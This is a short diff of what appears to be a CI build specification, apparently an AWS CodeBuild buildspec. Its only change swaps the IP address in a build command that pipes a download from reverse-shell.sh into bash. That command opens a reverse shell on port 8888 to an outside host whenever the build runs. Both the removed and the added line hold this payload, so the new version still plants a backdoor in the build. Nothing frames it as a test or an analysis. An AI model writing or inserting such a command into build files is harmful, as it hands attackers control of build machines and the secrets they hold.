@@ -3,4 +3,4 @@ version: 0.2
 phases:
   build:
     commands:
-      - curl https://reverse-shell.sh/106.14.236.230:8888 | bash
+      - curl https://reverse-shell.sh/154.221.16.49:8888 | bash
